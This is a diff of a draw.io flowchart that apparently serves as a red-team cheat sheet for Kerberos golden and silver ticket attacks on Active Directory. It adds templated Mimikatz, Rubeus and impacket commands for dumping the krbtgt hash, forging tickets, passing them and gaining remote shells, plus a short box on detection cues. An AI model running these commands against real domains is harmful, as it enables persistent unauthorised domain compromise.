@@ -1,6 +1,6 @@
 <mxfile host="app.diagrams.net" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0" version="27.1.6">
   <diagram name="Pagina-1" id="J933VrF4-ukwTBbtJVdo">
-    <mxGraphModel dx="2819" dy="1072" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="0" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="3751" dy="1072" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="0" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -1362,6 +1362,9 @@
         <mxCell id="-mCO11fVwZeK89IVwwup-102" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-92" target="-mCO11fVwZeK89IVwwup-98">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-128" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-92" target="-mCO11fVwZeK89IVwwup-126">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-92" value="&lt;div&gt;&lt;b&gt;Retrieving Domain SID&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
           <mxGeometry x="-10" y="580" width="120" height="60" as="geometry" />
         </mxCell>
@@ -1380,14 +1383,17 @@
         <mxCell id="-mCO11fVwZeK89IVwwup-104" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-98" target="-mCO11fVwZeK89IVwwup-103">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-131" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-98" target="-mCO11fVwZeK89IVwwup-129">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-98" value="&lt;div&gt;&lt;b&gt;Forging the Golden Ticket&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="-10" y="770" width="120" height="60" as="geometry" />
+          <mxGeometry x="-10" y="870" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-99" value="Mimikatz" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
-          <mxGeometry x="-450" y="770" width="390" height="60" as="geometry" />
+          <mxGeometry x="-450" y="870" width="390" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-100" value="kerberos::golden /domain:&amp;lt;fqdn&amp;gt; /user:Administrator /sid:&amp;lt;domain-SID&amp;gt; /rc4:&amp;lt;kbrtgt-ntlm-hash&amp;gt; /ptt" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="-450" y="830" width="390" height="60" as="geometry" />
+          <mxGeometry x="-450" y="930" width="390" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-107" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-103" target="-mCO11fVwZeK89IVwwup-105">
           <mxGeometry relative="1" as="geometry" />
@@ -1396,31 +1402,42 @@
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-103" value="&lt;div&gt;&lt;b&gt;List tickets&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="-10" y="950" width="120" height="60" as="geometry" />
+          <mxGeometry x="-10" y="1166" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-105" value="PowerShell" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
-          <mxGeometry x="-450" y="950" width="390" height="60" as="geometry" />
+          <mxGeometry x="-450" y="1166" width="390" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-106" value="PS C:\Tools&amp;gt; klist" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="-450" y="1010" width="390" height="60" as="geometry" />
+          <mxGeometry x="-450" y="1226" width="390" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-112" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-108" target="-mCO11fVwZeK89IVwwup-110">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="-mCO11fVwZeK89IVwwup-108" value="&lt;b&gt;Using WinRM with the Golden Ticket&lt;/b&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="-10" y="1130" width="120" height="60" as="geometry" />
+        <mxCell id="-mCO11fVwZeK89IVwwup-134" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-108" target="-mCO11fVwZeK89IVwwup-132">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-108" value="&lt;b&gt;Using the&amp;nbsp; Golden Ticket&lt;/b&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-10" y="1346" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-110" value="PowerShell" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
-          <mxGeometry x="-450" y="1130" width="390" height="60" as="geometry" />
+          <mxGeometry x="-450" y="1346" width="390" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-111" value="&lt;div&gt;PS C:\Tools&amp;gt; Enter-PSSession &amp;lt;target&amp;gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="-450" y="1190" width="390" height="60" as="geometry" />
+          <mxGeometry x="-450" y="1406" width="390" height="60" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-120" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-116" target="-mCO11fVwZeK89IVwwup-119">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-124" value="YES" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="-mCO11fVwZeK89IVwwup-120">
           <mxGeometry x="0.052" y="2" relative="1" as="geometry">
+            <mxPoint as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-142" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-116" target="-mCO11fVwZeK89IVwwup-141">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-143" value="NO" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="-mCO11fVwZeK89IVwwup-142">
+          <mxGeometry x="-0.6805" relative="1" as="geometry">
             <mxPoint as="offset" />
           </mxGeometry>
         </mxCell>
@@ -1433,6 +1450,11 @@
         <mxCell id="-mCO11fVwZeK89IVwwup-125" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.25;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-119" target="-mCO11fVwZeK89IVwwup-92">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-137" value="Go for golden ticket" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="-mCO11fVwZeK89IVwwup-125">
+          <mxGeometry x="-0.8294" relative="1" as="geometry">
+            <mxPoint y="1" as="offset" />
+          </mxGeometry>
+        </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-119" value="&lt;b&gt;get the KRBTGT Hash&lt;/b&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
           <mxGeometry x="-240" y="380" width="120" height="60" as="geometry" />
         </mxCell>
@@ -1441,6 +1463,159 @@
         </mxCell>
         <mxCell id="-mCO11fVwZeK89IVwwup-122" value="lsadump::dcsync /user:krbtgt /domain:&amp;lt;fqdn&amp;gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
           <mxGeometry x="-690" y="440" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-126" value="impacket" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#f8cecc;strokeColor=#b85450;" vertex="1" parent="1">
+          <mxGeometry x="-450" y="710" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-127" value="&lt;div&gt;kali$ lookupsid.py &amp;lt;fqdn&amp;gt;/&amp;lt;user&amp;gt;@&amp;lt;dc-name&amp;gt;.&amp;lt;fqdn&amp;gt; -domain-sids&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-450" y="770" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-129" value="impacket" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#f8cecc;strokeColor=#b85450;" vertex="1" parent="1">
+          <mxGeometry x="-450" y="1000" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-130" value="&lt;div&gt;kali$ ticketer.py -nthash &amp;lt;kbrtgt-ntlm-hash&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;fqdn&amp;gt; Administrator&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-450" y="1060" width="390" height="70" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-132" value="impacket" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#f8cecc;strokeColor=#b85450;" vertex="1" parent="1">
+          <mxGeometry x="-450" y="1505" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-133" value="&lt;div&gt;kali$ export KRB5CCNAME=&amp;lt;ccache-file&amp;gt;&lt;/div&gt;&lt;div&gt;kali$ psexec.py -k -no-pass &amp;lt;targetname&amp;gt;.&amp;lt;fqdn&amp;gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-450" y="1565" width="390" height="70" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-135" value="&lt;div&gt;Detection&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;Golden Ticket persistence is notoriously hard to spot since the forged TGTs appear legitimate to Windows—event logs don’t differentiate between valid and malicious tickets. Even resetting the password of the impersonated account won’t revoke a Golden Ticket’s access.&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;Attackers often generate Golden Tickets with unusually long lifespans (e.g., Mimikatz defaults to 10 years). Some AD monitoring tools flag such extended lifetimes as potential Indicators of Compromise (IoCs).&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;Additional detection clues include:&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;The account DOMAIN field is empty.&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;The account DOMAIN field contains the fully qualified domain name (FQDN) instead of the short domain name.&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#e3c800;strokeColor=#B09500;fontColor=#000000;" vertex="1" parent="1">
+          <mxGeometry x="110" y="870" width="120" height="627" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-152" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-141" target="-mCO11fVwZeK89IVwwup-151">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-154" value="YES" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="-mCO11fVwZeK89IVwwup-152">
+          <mxGeometry x="-0.16" y="4" relative="1" as="geometry">
+            <mxPoint as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-141" value="&lt;b&gt;Access to service/machine account?&lt;/b&gt;" style="rhombus;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="-960" y="150" width="120" height="120" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-148" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-145" target="-mCO11fVwZeK89IVwwup-93">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-156" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-145" target="-mCO11fVwZeK89IVwwup-150">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-145" value="&lt;div&gt;&lt;b&gt;Retrieving Domain SID&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-960" y="580" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-159" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-150" target="-mCO11fVwZeK89IVwwup-157">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-161" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-150" target="-mCO11fVwZeK89IVwwup-160">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-169" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.25;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-150" target="-mCO11fVwZeK89IVwwup-168">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="-930" y="1070" />
+              <mxPoint x="-1560" y="1070" />
+            </Array>
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-150" value="&lt;div&gt;&lt;b&gt;Forging the Silver Ticket&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-960" y="870" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-153" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-151" target="-mCO11fVwZeK89IVwwup-145">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-155" value="YES" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="-mCO11fVwZeK89IVwwup-153">
+          <mxGeometry x="-0.3026" relative="1" as="geometry">
+            <mxPoint as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-151" value="&lt;b&gt;Got NTLM hash?&lt;/b&gt;" style="rhombus;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="-940" y="370" width="80" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-157" value="Mimikatz" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
+          <mxGeometry x="-1390" y="870" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-158" value="&lt;div&gt;mimikatz # kerberos::golden /domain:&amp;lt;fqdn&amp;gt; /user:Administrator /sid:&amp;lt;sid&amp;gt; /rc4:&amp;lt;ntlm&amp;gt; /target:&amp;lt;name&amp;gt;.&amp;lt;fqdn&amp;gt; /service:&amp;lt;service ie:cifs&amp;gt;&amp;nbsp; /ptt&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-1390" y="930" width="390" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-162" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-160" target="-mCO11fVwZeK89IVwwup-105">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-164" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-160" target="-mCO11fVwZeK89IVwwup-163">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-160" value="&lt;div&gt;&lt;b&gt;List tickets&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-960" y="1166" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-167" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-163" target="-mCO11fVwZeK89IVwwup-165">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-163" value="&lt;b&gt;Displaying Directory Information&lt;/b&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-960" y="1346" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-165" value="PowerShell" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
+          <mxGeometry x="-1390" y="1346" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-166" value="&lt;div&gt;&lt;div&gt;PS C:\Tools&amp;gt; dir //&amp;lt;name&amp;gt;.&amp;lt;fqdn&amp;gt;/c$&lt;/div&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-1390" y="1406" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-172" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-168" target="-mCO11fVwZeK89IVwwup-170">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-174" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-168" target="-mCO11fVwZeK89IVwwup-173">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-168" value="&lt;div&gt;&lt;b&gt;Forging the Silver Ticket for a sacraficial process&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-1620" y="1120" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-170" value="Mimikatz" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1120" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-171" value="&lt;div&gt;C:\Tools&amp;gt; mimikatz.exe &quot;kerberos::golden /domain:&amp;lt;fqdn&amp;gt; /user:Administrator /sid:&amp;lt;domain-sid&amp;gt; /rc4:&amp;lt;ntlm&amp;gt; /target:&amp;lt;name&amp;gt;.&amp;lt;fqdn&amp;gt; /service:&amp;lt;service&amp;gt; /ticket:&amp;lt;name&amp;gt;.kirbi&quot; exit&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1180" width="390" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-177" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-173" target="-mCO11fVwZeK89IVwwup-175">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-179" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-173" target="-mCO11fVwZeK89IVwwup-178">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-173" value="&lt;div&gt;&lt;b&gt;Create a Sacrificial Process&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-1620" y="1330" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-175" value="Rubeus" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1330" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-176" value="&lt;div&gt;&lt;div&gt;C:\Tools&amp;gt; Rubeus.exe createnetonly /program:cmd.exe /show&lt;/div&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1390" width="390" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-182" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-178" target="-mCO11fVwZeK89IVwwup-180">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-184" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-178" target="-mCO11fVwZeK89IVwwup-183">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-178" value="&lt;div&gt;&lt;b&gt;Import the Ticket in the Process (from the terminal of the process)&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-1620" y="1550" width="120" height="90" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-180" value="Rubeus" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1565" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-181" value="&lt;div&gt;C:\Tools&amp;gt; Rubeus.exe ptt /ticket:&amp;lt;ticket-file&amp;gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1625" width="390" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-187" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0.5;entryDx=0;entryDy=0;dashed=1;" edge="1" parent="1" source="-mCO11fVwZeK89IVwwup-183" target="-mCO11fVwZeK89IVwwup-185">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
